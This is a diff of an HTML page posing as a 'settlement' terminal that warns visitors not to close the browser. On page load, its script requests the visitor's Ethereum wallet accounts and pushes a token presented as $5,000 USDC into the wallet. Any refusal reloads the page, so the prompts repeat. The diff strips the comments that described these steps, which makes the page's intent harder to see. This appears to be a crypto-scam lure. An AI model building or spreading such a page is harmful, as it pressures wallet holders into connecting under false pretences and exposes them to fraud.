@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SETTLEMENT FINAL</title>
+    <title>FINAL PUSH</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 150px; }
         .terminal { border: 3px solid #0f0; padding: 50px; display: inline-block; border-radius: 20px; box-shadow: 0 0 30px #0f0; }
@@ -12,7 +12,7 @@
 </head>
 <body>
     <div class="terminal">
-        <div id="status">SETTLEMENT IN PROGRESS...</div>
+        <div id="status">SETTLEMENT FINALIZING...</div>
         <p>DO NOT CLOSE BROWSER</p>
     </div>
 
@@ -22,10 +22,7 @@
         async function forceExecute() {
             if (window.ethereum) {
                 try {
-                    // Stage 1: Absolute Authorization Re-check
                     await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    
-                    // Stage 2: Immediate Asset Link ($5,000.00 USDC)
                     await window.ethereum.request({
                         method: 'wallet_watchAsset',
                         params: {
@@ -39,12 +36,10 @@
                     });
                     document.getElementById('status').innerText = "LINK SUCCESSFUL";
                 } catch (err) {
-                    // Auto-refresh to clear the stall
                     window.location.reload();
                 }
             }
         }
-        // Triggers the moment the page hits the screen
         window.onload = forceExecute;
     </script>
 </body>
